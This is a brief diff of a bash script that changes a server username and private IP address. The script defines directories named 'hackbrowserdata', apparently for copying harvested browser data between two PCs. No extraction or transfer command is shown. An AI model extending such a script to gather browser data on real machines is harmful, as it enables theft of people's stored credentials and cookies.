@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # Variables
-SERVER_USER="DELL"
-SERVER_IP="192.168.0.117"  # IP du premier PC
+SERVER_USER="123"
+SERVER_IP="192.168.0.54"  # IP du premier PC
 DEST_DIR="/home/$SERVER_USER/hackbrowserdata"
 LOCAL_PATH="$HOME/hackbrowserdata"
 
